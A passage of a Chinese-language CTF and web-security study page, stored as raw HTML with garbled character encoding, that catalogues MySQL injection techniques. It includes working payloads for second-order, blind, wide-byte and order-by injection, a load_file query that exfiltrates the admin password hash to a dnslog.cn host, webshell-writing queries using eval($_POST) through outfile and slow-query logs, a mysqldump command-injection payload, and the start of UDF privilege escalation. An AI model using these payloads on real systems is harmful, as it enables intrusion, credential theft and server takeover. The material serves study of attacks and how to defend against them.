ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’Œç©ºå­—èŠ‚ï¼‰å‰æ·»åŠ åæ–œæ å­—ç¬¦ã€‚æ‰€ä»¥è„æ•°æ®è¿˜æ˜¯è¿›å…¥åˆ°äº†æ•°æ®åº“ä¸­ã€‚</p><p>ä¿®æ”¹å¯†ç å¤„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†è„æ•°æ®å–å‡ºå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œé€ æˆäº†sqlæ³¨å…¥ã€‚</p><p><strong>å¸¸è§åœºæ™¯</strong></p><p>å°†ä¿å­˜çš„è„æ•°æ®ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå†æ¬¡è¿›è¡Œsqlæ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹è®¢å•ç­‰ä¿®æ”¹å·²ä¿å­˜ä¿¡æ¯çš„åœ°æ–¹</span><br><span class="line">æ³¨å†Œç”¨æˆ·åå¤„</span><br></pre></td></tr></table></figure><p><strong>ä¾‹é¢˜</strong></p><p>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#å¯æ§å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#å°†$_POST[&quot;address&quot;]ä¿å­˜åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$rowä¿å­˜sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#è°ƒç”¨äº†æŸ¥è¯¢ç»“æœ</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸Šé¢ä¸¤æ¡è¯­å¥ï¼Œå¯¹å¯æ§å‚æ•°addressåªè¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œå°±ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>å¹¶ä¸”åœ¨updateä¸­å¼•ç”¨äº†<code>$row[&#39;address&#39;]</code>ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å¯ä»¥çœ‹åˆ°åˆ—åä¸ºold_addressï¼Œåœ¨è¿›è¡Œä¿®æ”¹æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹æ—¶ï¼Œåœ¨addresså¤„æ³¨å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æŸ¥è¯¢æ—§åœ°å€æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h3 id="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"><a href="#ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥" class="headerlink" title="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"></a>ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥</h3><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>é¡µé¢æ— æ•°æ®å›æ˜¾ï¼Œä½†æ˜¯æœ‰ä¸¤ç§è¿”å›çŠ¶æ€ï¼Œpocå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=å­æŸ¥è¯¢ --+  </span><br><span class="line"># å­æŸ¥è¯¢=å­—ç¬¦ä¸²æˆªå–+æ¯”è¾ƒ</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">é€»è¾‘è¿æ¥ç¬¦</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">æˆ–</td><td align="center">or ï¼Œ||</td></tr><tr><td align="center">å¼‚æˆ–</td><td align="center">xorï¼Œ^</td></tr><tr><td align="center">æŒ‰ä½ä¸&#x2F;æˆ–</td><td align="center">&amp;ï¼Œ|</td></tr></tbody></table><p>å­—ç¬¦ä¸²æˆªå–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä»startä½ç½®å¼€å§‹,æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># ä»å·¦/å³æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>å› ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥è¦ç”¨<code>binary</code></p><p>BINARYå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p></blockquote><p>è¯­æ³•</p><table><thead><tr><th align="center">like</th><th align="center">æ­£åˆ™</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><p>æ—¶é—´ç›²æ³¨å°±æ˜¯<strong>åœ¨å¸ƒå°”ç›²æ³¨ä¸ŠåŠ äº†å»¶è¿Ÿæ—¶é—´å‡½æ•°sleep()</strong>,ç”¨åœ¨Trueå’ŒFalseå›æ˜¾éš¾ä»¥åŒºåˆ†æ—¶,é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­å¸ƒå°”é€»è¾‘çš„æ­£ç¡®ä¸å¦ã€‚</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(å¸ƒå°”,A,B)ä¸ä¸‰ç›®è¿ç®—ç¬¦é€»è¾‘ä¸€æ ·,åŠ ä¸Šsleepå‡½æ•°</span><br><span class="line"></span><br><span class="line">sleep(if(å¸ƒå°”,A,B))å¸ƒå°”æ­£ç¡®,å»¶è¿ŸAç§’,å¸ƒå°”é”™è¯¯,å»¶è¿ŸBç§’</span><br><span class="line"></span><br><span class="line">æˆ–è€… if(å¸ƒå°”,1,sleep(x))å¸ƒå°”æ­£ç¡®,æ— å»¶è¿Ÿ,å¸ƒå°”é”™è¯¯,å»¶è¿Ÿxç§’</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312232840696-1696561612774.png" alt="image-20230312232840696"></p><p><strong>å…¶ä»–èƒ½é€ æˆå»¶æ—¶æ•ˆæœçš„è¯­å¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># é€šè¿‡æ‰§è¡Œå¤šæ¬¡å‘½ä»¤å½¢æˆå»¶æ—¶</span><br><span class="line">benchmark(æ‰§è¡Œæ¬¡æ•°,sqlè¯­å¥)</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ä¸€äº›æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”é›†è¿ç®—ï¼Œå¯¼è‡´æŸ¥è¯¢ç¼“æ…¢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h3 id="DNSå¤–å¸¦æ³¨å…¥"><a href="#DNSå¤–å¸¦æ³¨å…¥" class="headerlink" title="DNSå¤–å¸¦æ³¨å…¥"></a>DNSå¤–å¸¦æ³¨å…¥</h3><h5 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h5><ol><li><p>MySQL Load_File()å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨Dnslogæ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®ï¼›</p></li><li><p>windowsä¸‹å­˜åœ¨<code>UNCè·¯å¾„</code></p><blockquote><p>UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h5><ul><li>windowsç³»ç»Ÿ</li><li><code>secure_file_priv</code>ä¸ºç©º</li></ul><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hexç¼–ç çš„ç›®çš„æ˜¯å‡å°‘å¹²æ‰°ï¼ŒåŸŸåæœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½å¸¦å…¥</span></span><br><span class="line"><span class="comment">-- \\\\è½¬ä¹‰  â†’  \\</span></span><br></pre></td></tr></table></figure><h3 id="SMBå¤–å¸¦æ³¨å…¥"><a href="#SMBå¤–å¸¦æ³¨å…¥" class="headerlink" title="SMBå¤–å¸¦æ³¨å…¥"></a>SMBå¤–å¸¦æ³¨å…¥</h3><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><h5 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>å®½å­—èŠ‚ï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œè¯¥å­—ç¬¦ç§°ä¸ºå®½å­—èŠ‚å­—ç¬¦</p><p><code>PHP</code>ä¸<code>Mysql</code>ä¹‹é—´çš„äº¤äº’</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>å°†phpçš„sqlè¯­å¥ä»¥<code>character_set_client</code>ç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬ä¸º16è¿›åˆ¶æ•°ï¼‰ï¼Œå†å°†16è¿›åˆ¶æ•°ä»¥<code>character_set_connection</code>è¿›è¡Œç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬æ¢ä¸ºurlç¼–ç ï¼‰ï¼Œç„¶åä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œurlè§£ç ï¼Œæœ€åä»¥<code>character_set_results</code>ç¼–ç è¾“å‡ºç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> æµè§ˆå™¨urlè‡ªåŠ¨è§£ç ===&gt; Î²<span class="string">&#x27; è½¬ä¹‰===&gt;Î²\&#x27;è½¬ä¸º16è¿›åˆ¶===&gt; 0xdf0x5c0x27 è½¬æ¢ä¸ºurlç¼–ç ===&gt; %df%5c%27 è¿›è¡Œurlè§£ç (å› ä¸ºæ˜¯GBKç¼–ç ï¼Œ%dfå’Œ%5cç»“åˆä¸ºæ±‰å­—)===&gt; é‹&#x27;</span></span><br></pre></td></tr></table></figure><p>ç®€å•çš„è¯´å°±æ˜¯é€šè¿‡å®½å­—èŠ‚åƒæ‰è½¬ä¹‰ç¬¦ï¼Œé€ƒé€¸å‡ºå•å¼•å·æ¥è¿›è¡Œé—­åˆ</p><h5 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p><code>sql-lab less-32</code></p><p>è½¬ä¹‰å­—ç¬¦</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>è®¾ç½®ç¼–ç é›†</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sqlè¯­å¥ï¼Œå•å¼•å·é—­åˆ</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1ï¿½&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h3 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h3><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><ul><li><p>çŸ¥é“åˆ—åçš„å‰æä¸‹ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(è¡¨è¾¾å¼,id,username)</span><br></pre></td></tr></table></figure></li><li><p>ä¸çŸ¥é“åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=if(è¡¨è¾¾å¼,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure></li></ul><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><h5 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h5><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>é«˜æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # showè¯­å¥è¦å †å æ³¨å…¥å’Œå›æ˜¾</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h6><p><strong>åŸºäºè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>å’Œ<code>dumpfile</code>çš„åŒºåˆ«</p><ul><li><code>outfile</code>å¯¼å‡ºæ•°æ®æ”¯æŒå¤šè¡Œï¼Œ<code>dumpfile</code>åªæ”¯æŒä¸€è¡Œ</li><li><code>outfile</code>ä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œ<code>dumpfile</code>ä¸ä¼š</li></ul><p>æ‰€ä»¥ä½¿ç”¨<code>into dumpfile</code>è¿™ä¸ªå‡½æ•°æ¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>éè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="å†™å…¥æ—¥å¿—æ–‡ä»¶"><a href="#å†™å…¥æ—¥å¿—æ–‡ä»¶" class="headerlink" title="å†™å…¥æ—¥å¿—æ–‡ä»¶"></a>å†™å…¥æ—¥å¿—æ–‡ä»¶</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --æŸ¥çœ‹é…ç½®ï¼Œæ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œå’Œmysqlé»˜è®¤logåœ°å€(è®°ä¸‹åŸåœ°å€æ–¹ä¾¿æ¢å¤)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # è¿™é‡Œæ—¥å¿—åˆ›å»ºæƒé™è¦ä½ä¸€äº›ï¼Œä¸èƒ½åœ¨cç›˜åˆ›å»º</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--ç»“æŸåï¼Œç—•è¿¹æ¸…ç†</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ…¢æŸ¥è¯¢</p><p>Fromï¼š<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨æ…¢æŸ¥è¯¢å†™å‘¢ï¼Ÿå› ä¸ºå¼€å¯æ—¥å¿—ç›‘æµ‹åæ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œç½‘ç«™è®¿é—®é‡å¤§çš„è¯æˆ‘ä»¬å†™çš„shellä¼šå‡ºé”™</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--æŸ¥çœ‹æ…¢æŸ¥è¯¢ä¿¡æ¯</span><br><span class="line">set global slow_query_log=1;--å¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—(é»˜è®¤ç¦ç”¨)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--æŸ¥çœ‹é»˜è®¤æ—¶é—´å€¼ï¼Œå½“sqlè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡è¯¥å€¼æ‰ä¼šè¢«è®¡å…¥æ—¥å¿—ä¸­ï¼Œé»˜è®¤10ç§’</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--å†™shellåˆ°æ…¢æŸ¥è¯¢æ—¥å¿—</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-â€“os-shell"><a href="#sqlmap-â€“os-shell" class="headerlink" title="sqlmap  â€“os-shell"></a>sqlmap  â€“os-shell</h5><ul><li><p>å¤§è‡´æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·å–ç›®æ ‡ä¿¡æ¯â†’ä½¿ç”¨lines terminated byå°†å…·æœ‰æ–‡ä»¶ä¸Šä¼ çš„ğŸä¸Šä¼ åˆ°ç½‘ç«™â†’é€çº§ç›®å½•è®¿é—®æ‰¾åˆ°ğŸ</span><br><span class="line"></span><br><span class="line">â†’é€šè¿‡è¯¥ğŸä¸Šä¼ çœŸæ­£çš„å‘½ä»¤ğŸâ†’æµ‹è¯•å‘½ä»¤ğŸèƒ½å¦æ‰§è¡Œâ†’åˆ é™¤ä¸Šä¼ çš„ä¸¤ä¸ªğŸ</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ ğŸï¼šformè¡¨å•</p></li><li><p>phpå‘½ä»¤é©¬ï¼šè·å¾—<code>disable_function</code>ï¼Œéå†æ‰€æœ‰ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œåˆ¤æ–­å“ªä¸€ä¸ªä¸åœ¨<code>disable_function</code>ã€‚</p></li></ul><h3 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h3><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>æ³¨æ„ï¼šè½¬ä¹‰å­—ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t é”™è¯¯è·¯å¾„</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# æ­£ç¡®</span><br><span class="line">select load_file(0x653A5C746573742E747874);# æ”¯æŒåå…­è¿›åˆ¶</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# æ”¯æŒcharå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h3 id="mysqldumpâ€“æ•°æ®åº“å¯¼å‡ºæ—¶çš„RCE"><a href="#mysqldumpâ€“æ•°æ®åº“å¯¼å‡ºæ—¶çš„RCE" class="headerlink" title="mysqldumpâ€“æ•°æ®åº“å¯¼å‡ºæ—¶çš„RCE"></a>mysqldumpâ€“æ•°æ®åº“å¯¼å‡ºæ—¶çš„RCE</h3><p><strong>shell</strong>ä¸‹æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # å¯¼å‡ºdb1ä¸­çš„a1ã€a2è¡¨</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡æœ¬å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“åˆ¤æ–­è¯­å¥-åˆ é™¤è¡¨-åˆ›å»ºè¡¨-é”è¡¨-ç¦ç”¨ç´¢å¼•-æ’å…¥æ•°æ®-å¯ç”¨ç´¢å¼•-è§£é”è¡¨</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><p><strong>ä¾‹é¢˜</strong></p><p>CISCN2023åˆèµ›â€“dumpit</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#é»‘åå•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>dbå’Œtableéƒ½å¯æ§ï¼Œè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œé€ æˆRCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><strong>UDFææƒ</strong></p><blockquote><p>UDFï¼ˆUser Define Functionï¼‰è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚</p></blockquote><p>UDFåˆ¶ä½œï¼š<a 